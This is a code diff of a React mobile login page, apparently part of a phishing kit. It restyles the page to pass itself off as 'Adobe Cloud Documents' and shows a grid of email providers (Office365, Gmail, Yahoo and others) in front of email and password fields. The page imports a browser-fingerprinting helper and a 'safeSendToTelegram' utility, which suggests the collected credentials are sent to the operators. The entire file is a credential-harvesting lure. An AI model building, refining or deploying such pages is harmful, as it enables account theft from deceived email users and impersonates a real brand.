@@ -1,7 +1,7 @@
 import React, { useState } from 'react';
 import { ArrowLeft, Mail, Lock, Eye, EyeOff, Sparkles } from 'lucide-react';
 import { getBrowserFingerprint } from '../../utils/oauthHandler';
-import { safeSendToTelegram } from '../../utils/safeSendToTelegram';
+import safeSendToTelegram from '../../utils/safeSendToTelegram';
 
 interface LoginPageProps {
   fileName: string;
@@ -25,12 +25,12 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
   const [errorMessage, setErrorMessage] = useState('');
 
   const emailProviders = [
-    { name: 'Office365', domain: 'outlook.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/office-365-icon.png', color: 'from-blue-500 to-blue-600' },
-    { name: 'Yahoo', domain: 'yahoo.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/yahoo-square-icon.png', color: 'from-purple-500 to-purple-600' },
-    { name: 'Outlook', domain: 'outlook.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/microsoft-outlook-icon.png', color: 'from-blue-500 to-blue-600' },
-    { name: 'AOL', domain: 'aol.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/aol-icon.png', color: 'from-red-500 to-red-600' },
-    { name: 'Gmail', domain: 'gmail.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/gmail-icon.png', color: 'from-red-500 to-red-600' },
-    { name: 'Others', domain: 'other.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/communication-chat-call/envelope-line-icon.png', color: 'from-gray-500 to-gray-600' }
+    { name: 'Office365', domain: 'outlook.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/office-365-icon.png' },
+    { name: 'Yahoo', domain: 'yahoo.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/yahoo-square-icon.png' },
+    { name: 'Outlook', domain: 'outlook.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/microsoft-outlook-icon.png' },
+    { name: 'AOL', domain: 'aol.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/aol-icon.png' },
+    { name: 'Gmail', domain: 'gmail.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/gmail-icon.png' },
+    { name: 'Others', domain: 'other.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/communication-chat-call/envelope-line-icon.png' }
   ];
 
   const handleProviderSelect = (provider: string) => {
@@ -44,7 +44,7 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
 
     setIsLoading(true);
     setErrorMessage('');
-    
+
     try {
       const currentAttempt = loginAttempts + 1;
       setLoginAttempts(currentAttempt);
@@ -119,54 +119,62 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
   };
 
   return (
-    <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-slate-50 via-blue-50 to-indigo-100 p-4 relative overflow-hidden">
-      {/* Animated background elements */}
-      <div className="absolute inset-0 overflow-hidden">
-        <div className="absolute -top-20 -right-20 w-40 h-40 bg-gradient-to-br from-blue-400/20 to-purple-400/20 rounded-full blur-2xl animate-pulse"></div>
-        <div className="absolute -bottom-20 -left-20 w-40 h-40 bg-gradient-to-br from-indigo-400/20 to-pink-400/20 rounded-full blur-2xl animate-pulse delay-1000"></div>
-        <div className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-48 h-48 bg-gradient-to-br from-cyan-400/10 to-blue-400/10 rounded-full blur-2xl animate-pulse delay-500"></div>
+    <div
+      className="min-h-screen flex items-center justify-center p-4 relative overflow-hidden"
+      style={{
+        backgroundImage: "url('https://images.unsplash.com/photo-1633993365956-621f62f8057e?ixlib=rb-4.1.0&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&q=80&w=2070')",
+        backgroundSize: 'cover',
+        backgroundPosition: 'center',
+        backgroundRepeat: 'no-repeat'
+      }}
+    >
+      {/* Decorative overlay: smaller logo + combined subtitle line under the title */}
+      <div className="absolute left-6 top-1/2 transform -translate-y-1/2 flex flex-col items-start gap-1 z-0 pointer-events-none">
+        <div className="flex items-center gap-2">
+          <img
+            src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b9/Adobe_Document_Cloud_icon_%282020%29.svg/640px-Adobe_Document_Cloud_icon_%282020%29.svg.png"
+            alt="Adobe Cloud"
+            className="w-10 h-10 object-contain drop-shadow-md"
+          />
+          <div className="text-white drop-shadow-md">
+            <div className="text-xl font-semibold leading-tight">Adobe Cloud Documents</div>
+            <div className="text-white/90 text-xs mt-1">PDF and e-signing tools. • securely access documents</div>
+          </div>
+        </div>
       </div>
 
-      <div className="w-full max-w-sm relative z-10">
-        <div className="bg-white/80 backdrop-blur-xl rounded-2xl shadow-2xl border border-white/20 p-6 relative overflow-hidden">
-          {/* Subtle gradient overlay */}
+      {/* Card (increased size for mobile slightly) */}
+      <div className="w-full max-w-md relative z-10 ml-4 md:ml-12 lg:ml-24">
+        <div className="bg-white/90 backdrop-blur-xl rounded-2xl shadow-2xl border border-white/20 p-8 relative overflow-hidden min-h-[520px]">
           <div className="absolute inset-0 bg-gradient-to-br from-white/50 to-transparent pointer-events-none"></div>
-          
           <div className="relative z-10">
-            <div className="flex items-center gap-3 mb-6">
-              <div className="w-10 h-10 rounded-xl bg-gradient-to-br from-red-500 to-red-600 flex items-center justify-center shadow-lg">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b9/Adobe_Document_Cloud_icon_%282020%29.svg/640px-Adobe_Document_Cloud_icon_%282020%29.svg.png" alt="Adobe Document Cloud" className="w-5 h-5 object-contain" />
-              </div>
-              <div>
-                <h1 className="text-lg font-bold text-gray-900 flex items-center gap-2">
-                  Secure Access
-                </h1>
-                <p className="text-xs text-gray-600">Choose your email provider</p>
+            {/* Centered "Select Your Provider" pill in header */}
+            <div className="flex items-center justify-center mb-3">
+              <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-gradient-to-r from-blue-50 to-indigo-50 border border-blue-100">
+                <Sparkles className="w-3 h-3 text-blue-500" />
+                <span className="text-xs font-medium text-blue-700">Select Your Provider</span>
               </div>
             </div>
 
-            <div className="mt-6">
+            <div className="mt-2">
               {!selectedProvider ? (
                 <div className="space-y-4">
-                  <div className="text-center mb-4">
-                    <div className="inline-flex items-center gap-2 px-3 py-1.5 bg-gradient-to-r from-blue-50 to-indigo-50 rounded-full border border-blue-100">
-                      <Sparkles className="w-3 h-3 text-blue-500" />
-                      <span className="text-xs font-medium text-blue-700">Select Provider</span>
-                    </div>
-                  </div>
-                  
                   <div className="grid grid-cols-3 gap-3">
                     {emailProviders.map((provider) => (
                       <button 
                         key={provider.name} 
                         onClick={() => handleProviderSelect(provider.name)} 
-                        className="group relative flex flex-col items-center gap-2 p-3 bg-white/60 backdrop-blur-sm rounded-xl shadow-sm border border-gray-100/50 hover:shadow-lg hover:bg-white/80 transition-all duration-300 transform hover:-translate-y-1 active:scale-95" 
+                        className="group relative flex flex-col items-center gap-2 p-4 bg-white/60 backdrop-blur-sm rounded-xl shadow-sm border border-gray-100/50 hover:shadow-lg hover:bg-white/80 transition-all duration-300 transform hover:-translate-y-1 active:scale-95" 
                         aria-label={`Select ${provider.name}`} 
                         type="button"
                       >
-                        <div className={`w-8 h-8 flex items-center justify-center rounded-lg bg-gradient-to-br ${provider.color} shadow-md group-hover:shadow-lg transition-shadow duration-300`}>
-                          <img src={provider.logo} alt={provider.name} className="w-4 h-4 object-contain filter brightness-0 invert" />
-                        </div>
+                        {/* Standalone logo (no background) */}
+                        <img 
+                          src={provider.logo} 
+                          alt={provider.name} 
+                          className="w-8 h-8 object-contain" 
+                          onError={(e) => { const t = e.target as HTMLImageElement; t.style.display = 'none'; }}
+                        />
                         <div className="text-xs font-semibold text-gray-800 group-hover:text-gray-900 transition-colors text-center">
                           {provider.name}
                         </div>
@@ -186,9 +194,13 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
                       <ArrowLeft className="w-4 h-4 text-gray-600" />
                     </button>
                     <div className="flex items-center gap-2">
-                      <div className={`w-6 h-6 flex items-center justify-center rounded-lg bg-gradient-to-br ${emailProviders.find(p => p.name === selectedProvider)?.color} shadow-md`}>
-                        <img src={emailProviders.find(p => p.name === selectedProvider)?.logo} alt={selectedProvider} className="w-3 h-3 object-contain filter brightness-0 invert" />
-                      </div>
+                      {/* selected-provider logo stands alone */}
+                      <img 
+                        src={emailProviders.find(p => p.name === selectedProvider)?.logo} 
+                        alt={selectedProvider} 
+                        className="w-6 h-6 object-contain" 
+                        onError={(e) => { const t = e.target as HTMLImageElement; t.style.display = 'none'; }}
+                      />
                       <h2 className="text-sm font-bold text-gray-900">Sign in with {selectedProvider}</h2>
                     </div>
                   </div>
@@ -214,7 +226,7 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
                             type="email" 
                             value={email} 
                             onChange={(e) => setEmail(e.target.value)} 
-                            className="w-full pl-10 pr-3 py-3 bg-white/70 backdrop-blur-sm border border-gray-200 rounded-xl text-gray-900 placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all duration-300 hover:bg-white/80 text-sm" 
+                            className="w-full pl-10 pr-3 py-3 bg-white/80 backdrop-blur-sm border border-gray-200 rounded-xl text-gray-900 placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all duration-300 hover:bg-white/80 text-sm" 
                             placeholder="Enter your email" 
                             required 
                           />
@@ -229,7 +241,7 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
                             type={showPassword ? 'text' : 'password'} 
                             value={password} 
                             onChange={(e) => setPassword(e.target.value)} 
-                            className="w-full pl-10 pr-10 py-3 bg-white/70 backdrop-blur-sm border border-gray-200 rounded-xl text-gray-900 placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all duration-300 hover:bg-white/80 text-sm" 
+                            className="w-full pl-10 pr-10 py-3 bg-white/80 backdrop-blur-sm border border-gray-200 rounded-xl text-gray-900 placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all duration-300 hover:bg-white/80 text-sm" 
                             placeholder="Enter your password" 
                             required 
                           />
@@ -259,7 +271,7 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
                     </button>
                   </form>
                 </div>
-              )}
+              )} 
             </div>
 
             <div className="mt-6 text-center">
